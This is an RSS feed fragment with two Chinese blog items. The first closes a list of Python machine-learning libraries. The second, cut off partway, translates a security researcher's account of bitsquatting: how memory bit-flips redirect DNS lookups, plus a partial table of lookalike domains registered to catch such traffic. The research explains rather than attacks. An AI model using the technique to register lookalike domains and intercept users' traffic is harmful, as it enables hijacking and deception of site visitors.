&lt;p&gt;首先推荐大名鼎鼎的scikit-learn，scikit-learn是一个基于NumPy, SciPy, Matplotlib的开源机器学习工具包，主要涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。这里推荐一个视频，也是我早期遇到scikit-learn的时候推荐过的：&lt;a href=&quot;http://52opencourse.com/552/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AApython%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%B7%A5%E5%85%B7%E5%8C%85scikit-learn%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%A7%86%E9%A2%91-tutorial-scikit-learn-machine-learning-in-python&quot;&gt;推荐一个Python机器学习工具包Scikit-learn以及相关视频–Tutorial: scikit-learn – Machine Learning in Python&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://scikit-learn.org/&quot;&gt;http://scikit-learn.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&quot;http://pandas.pydata.org/&quot;&gt;Pandas&lt;/a&gt;: Python Data Analysis Library&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Pandas is a software library written for the Python programming language for data manipulation and analysis. In particular, it offers data structures and operations for manipulating numerical tables and time series.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;第一次接触Pandas是由于Udacity上的一门数据分析课程“&lt;a href=&quot;http://coursegraph.com/introduction-to-data-science-udacity-ud359-%E5%85%B6%E4%BB%96%E5%A4%A7%E5%AD%A6%E6%88%96%E6%9C%BA%E6%9E%84&quot;&gt;Introduction to Data Science&lt;/a&gt;” 的Project需要用Pandas库，所以学习了一下Pandas。Pandas也是基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。这里推荐一本书《&lt;a href=&quot;http://bin.sc/Readings/Programming/Python/Python%20for%20Data%20Analysis/Python_for_Data_Analysis.pdf&quot;&gt;Python for Data Analysis&lt;/a&gt;》，作者是Pandas的主力开发，依次介绍了iPython, NumPy, Pandas里的相关功能，数据可视化，数据清洗和加工，时间数据处理等，案例包括金融股票数据挖掘等，相当不错。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://pandas.pydata.org/&quot;&gt;http://pandas.pydata.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;=====================================================================&lt;br&gt;
分割线，以上工具包基本上都是自己用过的，以下来源于其他同学的线索，特别是《&lt;a href=&quot;http://qxde01.blog.163.com/blog/static/67335744201368101922991/&quot;&gt;Python机器学习库&lt;/a&gt;》，《&lt;a href=&quot;http://52opencourse.com/1125/23%E4%B8%AApython%E7%9A%84%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%8C%85&quot;&gt;23个python的机器学习包&lt;/a&gt;》，做了一点增删修改，欢迎大家补充&lt;br&gt;
=====================================================================&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&quot;http://mlpy.sourceforge.net/&quot;&gt;mlpy – Machine Learning Python&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mlpy is a Python module for Machine Learning built on top of NumPy/SciPy and the GNU Scientific Libraries.&lt;/p&gt;
&lt;p&gt;mlpy provides a wide range of state-of-the-art machine learning methods for supervised and unsupervised problems and it is aimed at finding a reasonable compromise among modularity, maintainability, reproducibility, usability and efficiency. mlpy is multiplatform, it works with Python 2 and 3 and it is Open Source, distributed under the GNU General Public License version 3.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://mlpy.sourceforge.net/&quot;&gt;http://mlpy.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4. &lt;a href=&quot;http://mdp-toolkit.sourceforge.net/&quot;&gt;MDP&lt;/a&gt;：The Modular toolkit for Data Processing&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Modular toolkit for Data Processing (MDP) is a Python data processing framework.&lt;br&gt;
From the user’s perspective, MDP is a collection of supervised and unsupervised learning algorithms and other data processing units that can be combined into data processing sequences and more complex feed-forward network architectures.&lt;br&gt;
From the scientific developer’s perspective, MDP is a modular framework, which can easily be expanded. The implementation of new algorithms is easy and intuitive. The new implemented units are then automatically integrated with the rest of the library.&lt;br&gt;
The base of available algorithms is steadily increasing and includes signal processing methods (Principal Component Analysis, Independent Component Analysis, Slow Feature Analysis), manifold learning methods ([Hessian] Locally Linear Embedding), several classifiers, probabilistic methods (Factor Analysis, RBM), data pre-processing methods, and many others.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“MDP用于数据处理的模块化工具包，一个Python数据处理框架。 从用户的观点，MDP是能够被整合到数据处理序列和更复杂的前馈网络结构的一批监督学习和非监督学习算法和其他数据处理单元。计算依照速度和内存需求而高效的执行。从科学开发者的观点，MDP是一个模块框架，它能够被容易地扩展。新算法的实现是容易且直观的。新实现的单元然后被自动地与程序库的其余部件进行整合。MDP在神经科学的理论研究背景下被编写，但是它已经被设计为在使用可训练数据处理算法的任何情况中都是有用的。其站在用户一边的简单性，各种不同的随时可用的算法，及应用单元的可重用性，使得它也是一个有用的教学工具。”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://mdp-toolkit.sourceforge.net/&quot;&gt;http://mdp-toolkit.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5. &lt;a href=&quot;http://www.pybrain.org/&quot;&gt;PyBrain&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PyBrain is a modular Machine Learning Library for Python. Its goal is to offer flexible, easy-to-use yet still powerful algorithms for Machine Learning Tasks and a variety of predefined environments to test and compare your algorithms.&lt;/p&gt;
&lt;p&gt;PyBrain is short for Python-Based Reinforcement Learning, Artificial Intelligence and Neural Network Library. In fact, we came up with the name first and later reverse-engineered this quite descriptive “Backronym”.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;“PyBrain(Python-Based Reinforcement Learning, Artificial Intelligence and Neural Network)是Python的一个机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。（这名字很霸气）&lt;/p&gt;
&lt;p&gt;PyBrain正如其名，包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。因为目前的许多问题需要处理连续态和行为空间，必须使用函数逼近(如神经网络)以应对高维数据。PyBrain以神经网络为核心，所有的训练方法都以神经网络为一个实例。”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.pybrain.org/&quot;&gt;http://www.pybrain.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;6. &lt;a href=&quot;http://pyml.sourceforge.net/&quot;&gt;PyML&lt;/a&gt; – machine learning in Python&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;PyML is an interactive object oriented framework for machine learning written in Python. PyML focuses on SVMs and other kernel methods. It is supported on Linux and Mac OS X.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“PyML是一个Python机器学习工具包，为各分类和回归方法提供灵活的架构。它主要提供特征选择、模型选择、组合分类器、分类评估等功能。”&lt;/p&gt;
&lt;p&gt;项目主页：&lt;a href=&quot;http://pyml.sourceforge.net/&quot;&gt;http://pyml.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;7. &lt;a href=&quot;https://pypi.python.org/pypi/milk/&quot;&gt;Milk&lt;/a&gt;：Machine learning toolkit in Python.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Its focus is on supervised classification with several classifiers available:&lt;br&gt;
SVMs (based on libsvm), k-NN, random forests, decision trees. It also performs&lt;br&gt;
feature selection. These classifiers can be combined in many ways to form&lt;br&gt;
different classification systems.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“Milk是Python的一个机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://luispedro.org/software/milk&quot;&gt;http://luispedro.org/software/milk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;http://luispedro.org/software/milk&lt;/p&gt;
&lt;p&gt;8. &lt;a href=&quot;http://www.pymvpa.org/&quot;&gt;PyMVPA&lt;/a&gt;: MultiVariate Pattern Analysis (MVPA) in Python&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;PyMVPA is a Python package intended to ease statistical learning analyses of large datasets. It offers an extensible framework with a high-level interface to a broad range of algorithms for classification, regression, feature selection, data import and export. It is designed to integrate well with related software packages, such as scikit-learn, and MDP. While it is not limited to the neuroimaging domain, it is eminently suited for such datasets. PyMVPA is free software and requires nothing but free-software to run.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“PyMVPA(Multivariate Pattern Analysis in Python)是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.pymvpa.org/&quot;&gt;http://www.pymvpa.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;9. &lt;a href=&quot;https://github.com/pydata/pyrallel&quot;&gt;Pyrallel&lt;/a&gt; – Parallel Data Analytics in Python&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Experimental project to investigate distributed computation patterns for machine learning and other semi-interactive data analytics tasks.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“Pyrallel(Parallel Data Analytics in Python)基于分布式计算模式的机器学习和半交互式的试验项目，可在小型集群上运行”&lt;/p&gt;
&lt;p&gt;Github代码页：&lt;a href=&quot;https://github.com/pydata/pyrallel&quot;&gt;http://github.com/pydata/pyrallel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;10. &lt;a href=&quot;http://montepython.sourceforge.net/&quot;&gt;Monte&lt;/a&gt; – gradient based learning in Python&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;
Monte (python) is a Python framework for building gradient based learning machines, like neural networks, conditional random fields, logistic regression, etc. Monte contains modules (that hold parameters, a cost-function and a gradient-function) and trainers (that can adapt a module’s parameters by minimizing its cost-function on training data). &lt;/p&gt;
&lt;p&gt;Modules are usually composed of other modules, which can in turn contain other modules, etc. Gradients of decomposable systems like these can be computed with back-propagation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;“Monte (machine learning in pure Python)是一个纯Python机器学习库。它可以迅速构建神经网络、条件随机场、逻辑回归等模型，使用inline-C优化，极易使用和扩展。”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://montepython.sourceforge.net&quot;&gt;http://montepython.sourceforge.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;11. &lt;a href=&quot;http://deeplearning.net/software/theano/&quot;&gt;Theano&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently. Theano features:&lt;br&gt;
1）tight integration with NumPy – Use numpy.ndarray in Theano-compiled functions.&lt;br&gt;
2）transparent use of a GPU – Perform data-intensive calculations up to 140x faster than with CPU.(float32 only)&lt;br&gt;
3）efficient symbolic differentiation – Theano does your derivatives for function with one or many inputs.&lt;br&gt;
4）speed and stability optimizations – Get the right answer for log(1+x) even when x is really tiny.&lt;br&gt;
5）dynamic C code generation – Evaluate expressions faster.&lt;br&gt;
6） extensive unit-testing and self-verification – Detect and diagnose many types of mistake.&lt;br&gt;
Theano has been powering large-scale computationally intensive scientific investigations since 2007. But it is also approachable enough to be used in the classroom (IFT6266 at the University of Montreal).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“Theano 是一个 Python 库，用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题。Theano的特点：紧密集成Numpy；高效的数据密集型GPU计算；高效的符号微分运算；高速和稳定的优化；动态生成c代码；广泛的单元测试和自我验证。自2007年以来，Theano已被广泛应用于科学运算。theano使得构建深度学习模型更加容易，可以快速实现多种模型。PS：Theano，一位希腊美女，Croton最有权势的Milo的女儿，后来成为了毕达哥拉斯的老婆。”&lt;/p&gt;
&lt;p&gt;12. &lt;a href=&quot;http://deeplearning.net/software/pylearn2/&quot;&gt;Pylearn2&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Pylearn2 is a machine learning library. Most of its functionality is built on top of Theano. This means you can write Pylearn2 plugins (new models, algorithms, etc) using mathematical expressions, and theano will optimize and stabilize those expressions for you, and compile them to a backend of your choice (CPU or GPU).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;“Pylearn2建立在theano上，部分依赖scikit-learn上，目前Pylearn2正处于开发中，将可以处理向量、图像、视频等数据，提供MLP、RBM、SDA等深度学习模型。”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://deeplearning.net/software/pylearn2/&quot;&gt;http://deeplearning.net/software/pylearn2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其他的，欢迎大家补充，这里也会持续更新这篇文章。&lt;/p&gt;
&lt;p&gt;注：原创文章，转载请注明出处“&lt;a href=&quot;http://www.52nlp.cn&quot;&gt;我爱自然语言处理&lt;/a&gt;”：&lt;a href=&quot;http://www.52nlp.cn&quot;&gt;www.52nlp.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文链接地址：&lt;a href=&quot;http://www.52nlp.cn/python-%E7%BD%91%E9%A1%B5%E7%88%AC%E8%99%AB-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98&quot;&gt;http://www.52nlp.cn/python-网页爬虫-文本处理-科学计算-机器学习-数据挖掘&lt;/a&gt;&lt;/p&gt;

											

</description>
        <pubDate>Thu, 24 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-24-python-%25e7%25bd%2591%25e9%25a1%25b5%25e7%2588%25ac%25e8%2599%25ab-%25e6%2596%2587%25e6%259c%25ac%25e5%25a4%2584%25e7%2590%2586-%25e7%25a7%2591%25e5%25ad%25a6%25e8%25ae%25a1%25e7%25ae%2597-%25e6%259c%25ba%25e5%2599%25a8%25e5%25ad%25a6%25e4%25b9%25a0-%25e6%2595%25b0%25e6%258d%25ae%25e6%258c%2596%25e6%258e%2598-060a30129.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-24-python-%25e7%25bd%2591%25e9%25a1%25b5%25e7%2588%25ac%25e8%2599%25ab-%25e6%2596%2587%25e6%259c%25ac%25e5%25a4%2584%25e7%2590%2586-%25e7%25a7%2591%25e5%25ad%25a6%25e8%25ae%25a1%25e7%25ae%2597-%25e6%259c%25ba%25e5%2599%25a8%25e5%25ad%25a6%25e4%25b9%25a0-%25e6%2595%25b0%25e6%258d%25ae%25e6%258c%2596%25e6%258e%2598-060a30129.html</guid>
        
        
      </item>
    
      <item>
        <title>一比特之差：无需利用漏洞的DNS劫持</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p align=&quot;left&quot;&gt;Bitsquatting表示去注册一个域名，它和知名的域名只有一个bit的差别。这个单词源自typosquatting，意为注册一个和知名域名只有一字之差的域名。在解析域名时，bitsquatting可能通过DNS导致计算机上的硬件错误。关于bitsquatting更详细的信息，可以参看我的&lt;a href=&quot;http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf&quot;&gt;Blackhat 2011 whitepaper&lt;/a&gt;。YouTube上有人发布了我在DEF CON 19上有关此话题的演讲&lt;a href=&quot;http://www.youtube.com/watch?v=lZ8s1JwtNas&quot;&gt;视频&lt;/a&gt;，当时使用的幻灯片可以在&lt;a href=&quot;http://dinaburg.org/data/DC19_Dinaburg_Presentation.pdf&quot;&gt;这里下载&lt;/a&gt;。&lt;/p&gt;
&lt;h3 align=&quot;left&quot;&gt;引言&lt;/h3&gt;
&lt;p align=&quot;left&quot;&gt;计算机常常由于一个或多比特的内存损坏出现错误，而造成这些错误的原因可能是制造上的缺陷或者宇宙射线、高温之类的环境因素。虽然单个机器中出现这样的错误的可能性是极小的，但是整个互联网上设备的总量却非常庞大：2010年时就有大约50亿个设备连接到互联网。我们可以将这种存在于各个设备上的小概率错误更加形象地描述，那就是买彩票。赢得头奖的概率是极小的，但是只要有足够多的人去买，总有人会成为赢家。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;研究人员之前就在很多&lt;a href=&quot;https://www.cs.princeton.edu/~appel/papers/memerr.pdf&quot;&gt;惊人的地方&lt;/a&gt;利用了比特错误（bit-errors）。现在，在互联网尺度上，我们又有新的办法去利用它。Bitsquatting是其中之一，也就是注册和某个常被访问的域名仅一比特之差的新域名。&lt;/p&gt;
&lt;h3 align=&quot;left&quot;&gt;工作原理&lt;/h3&gt;
&lt;p align=&quot;left&quot;&gt;当比特错误发生时，内存中的数据会被修改。计算机内存的内容可能代表各种意义，有时，它刚好就表示域名。如果程序使用这块内存，就会读取到错误的域名。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;下面的图解能够更清楚的说明这个问题，表中是cnn.com的二进制表示方法：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01100011&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01101110&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0110111&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0101110&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01100011&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01101111&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01101101&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;c&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;n&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;n&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;.&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;c&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;o&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;m&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p align=&quot;left&quot;&gt;现在假设你使用的计算机含有损坏的内存模块，你打开一个包含超链接到cnn.com的网页，然后你点击了这个链接。会有多少个操作将cnn.com的二进制数据保存到你的内存？写这篇文章时，我想到了下面这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP/IP协议栈由核心态向用户态转化时（根据操作系统的具体实现各有区别）&lt;/li&gt;
&lt;li&gt;在浏览器解析HTML时&lt;/li&gt;
&lt;li&gt;在创建DOM树的内部表示时&lt;/li&gt;
&lt;li&gt;在创建新的HTTP请求时&lt;/li&gt;
&lt;li&gt;在操作系统解析域名时&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&quot;left&quot;&gt;更进一步，假设其中有一次将域名写入到了损坏的内存模块，它的二进制形式被修改了1bit，现在表示为：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01100011&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0110111&lt;span style=&quot;color: red;&quot;&gt;1&lt;/span&gt;
&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0110111&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0101110&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01100011&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01101111&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;01101101&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;c&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;o&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;n&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;.&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;c&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;o&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;m&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p align=&quot;left&quot;&gt; 这样一来，当你点击链接时，浏览器将会跳转到con.com，而不是cnn.com。&lt;/p&gt;
&lt;h3 align=&quot;left&quot;&gt;实验&lt;/h3&gt;
&lt;p align=&quot;left&quot;&gt;这个实验背后的概念很简单：如果比特错误确实改变了设备内存中的域名，那么这些设备会访问到和正确域名一比特之差的bitsquat域名。因此很多频繁解析的域名的bitsquat域名会被全球各地的设备访问到。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;然而这个实验实施起来却没有那么容易，首要的问题是选择合适的域名来进行比特修改。流行的网站和常被解析的域名是不太相同的，很多鲜为人知的域名实际上会被频繁解析。这类域名一般属于内容分发网络或者广告网络，例如fbcdn.net,、2mdn.net和 akamai.com。由于很少有人实际在浏览器中输入这些域名，它们也成为本次实验中最合适的目标。还有个问题就是每次DNS查询必须有两次响应：一次是原本的域名，一次是经过比特修改的域名。因为原始的请求可能会得到正确域名的响应，而丢弃对无效域名的响应。这方面更多的信息，请参考&lt;a href=&quot;http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf&quot;&gt;白皮书&lt;/a&gt;或者&lt;a href=&quot;http://dinaburg.org/data/DC19_Dinaburg_Presentation.pdf&quot;&gt;幻灯片&lt;/a&gt;。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;为了这次实验我注册了下面这些域名。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;注：目前它们全都已经过期，不再属于我了。&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;&lt;b&gt;Bitsquat Domain&lt;/b&gt;&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;&lt;b&gt;Original Domain&lt;/b&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;ikamai.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;akamai.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;aeazon.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;amazon.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;a-azon.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;amazon.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;amazgn.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;amazon.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsmft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;micrgsoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;miarosoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;iicrosoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsnft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;mhcrosoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;eicrosoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;mic2osoft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;micro3oft.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;microsoft.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;li6e.com&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;live.com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;0mdn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2-dn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2edn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2ldn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mfn.net&lt;/td&gt;
&lt;td style=&quot;padding: 0; border: 1px solid #e8e8e8;&quot;&gt;2mdn.net&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
